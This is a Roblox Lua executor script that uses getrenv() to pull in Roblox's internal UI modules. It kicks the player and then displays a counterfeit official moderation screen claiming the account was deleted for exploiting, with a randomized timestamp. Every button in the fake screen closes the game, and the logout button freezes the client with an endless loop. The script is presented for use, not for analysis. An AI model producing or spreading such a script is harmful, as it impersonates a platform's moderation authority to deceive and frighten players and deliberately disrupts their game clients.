task.spawn(function()
    local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
    local Roact = getrenv().require(game:GetService("CorePackages").Roact)
    UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
    local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
    game.Players.LocalPlayer:Kick()
    game:GetService("GuiService"):ClearError()
    local e = Roact.createElement(auth, {
        style = {},
        screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
        moderationDetails = {
            punishmentTypeDescription = "Delete",
            beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
            reactivateAccountActivated = true,
            badUtterances = {},
            messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting. (BYFRON)"
        },
        termsActivated = function() 
            game:Shutdown()
        end,
        communityGuidelinesActivated = function() 
            game:Shutdown()
        end,
        supportFormActivated = function() 
            game:Shutdown()
        end,
        reactivateAccountActivated = function() 
            game:Shutdown()
        end,
        logoutCallback = function()
            while true do end
        end,
        globalGuiInset = {
            top = 0
        }
    })
    local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
    local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
    local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
    local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
    local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
            localization = tLocalization.mock()
        }, {Roact.createElement(UIBlox.Style.Provider, {
                style = {
                    Theme = darktheme,
                    Font = gotham
                },
            }, {e})}))
    Roact.mount(screengui, game.CoreGui)
end)
